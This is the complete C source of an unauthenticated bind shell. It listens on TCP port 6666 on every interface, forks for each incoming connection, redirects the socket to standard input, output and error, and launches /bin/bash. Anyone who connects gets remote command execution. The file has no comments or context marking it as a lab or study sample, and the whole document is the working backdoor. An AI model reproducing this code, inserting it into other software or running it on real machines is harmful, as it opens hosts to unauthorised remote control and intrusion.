#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <signal.h>
#include <bits/signum-arch.h>
#include <sys/wait.h>

#define PORT 6666

void Wait(int arg){
    wait(NULL);
}
void Exit(int arg){
    printf("\nProgram Exit...\nBYE...\n");
    exit(0);
}

int main(int argc, char const *argv[]) {
    signal(SIGCHLD, Wait);
    signal(SIGINT, Exit);
    int listenfd = socket(AF_INET, SOCK_STREAM, 0);
    if (listenfd < 0) {
        perror("socket");
        exit(1);
    }
    struct sockaddr_in serveraddr, clientaddr;
    int len = sizeof(serveraddr), ret;
    bzero(&serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(PORT);
    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);

    ret = bind(listenfd, (const struct sockaddr *) &serveraddr, len);
    if (ret < 0) {
        perror("bind");
        exit(1);
    }
    ret = listen(listenfd, 128);
    if (ret < 0) {
        perror("listen");
        exit(1);
    }

    int lfd = 0;
begin:
    lfd = accept(listenfd, (struct sockaddr *) &clientaddr, &len);
    if (lfd < 0) {
        perror("accept");
        exit(1);
    }
    pid_t pt = fork();
    if (pt<0){
        perror("fork");
        close(listenfd);
        exit(1);
    } else if (pt==0){
        close(listenfd);
        dup2(lfd, 0);
        dup2(lfd, 1);
        dup2(lfd, 2);
        execl("/bin/bash", 0LL, 0LL);
    } else{
        close(lfd);
        goto begin;
    }
    close(listenfd);
    return 0;
}